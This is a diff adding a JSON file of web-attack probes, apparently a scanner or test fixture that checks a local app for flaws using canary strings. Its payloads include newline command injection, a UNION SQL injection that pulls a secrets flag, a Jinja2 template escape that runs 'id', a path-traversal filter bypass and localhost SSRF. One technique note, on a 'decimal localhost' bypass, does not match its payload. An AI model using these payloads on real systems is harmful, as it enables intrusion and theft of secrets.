@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%0awhich%20id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "URL-encoded newline + which command to bypass shell metachar filter"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\nid#"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Literal newline in POST body + comment to bypass regex anchors"
+  },
+  {
+    "id": "dyn_ssrf_1",
+    "endpoint": "/fetch",
+    "method": "GET",
+    "params": {
+      "url": "http://127.0.0.1:8080/healthz"
+    },
+    "detect_pattern": "CANARY_SSRF_3e7d2c",
+    "technique": "Decimal localhost bypass host allowlist via direct IP"
+  },
+  {
+    "id": "dyn_path_1",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//tmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "Double-dot bypass: ....// to evade .. substring check"
+  },
+  {
+    "id": "dyn_sqli_1",
+    "endpoint": "/search",
+    "method": "GET",
+    "params": {
+      "q": "' UNION SELECT flag FROM secrets LIMIT 1--"
+    },
+    "detect_pattern": "CANARY_SQLI_7f3a9c",
+    "technique": "UNION-based SQLi to extract secrets table flag column"
+  },
+  {
+    "id": "dyn_ssti_1",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Jinja2 sandbox escape via __class__ chain to access os module"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{ssti_canary}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Direct template variable reference to leak canary"
+  }
+]
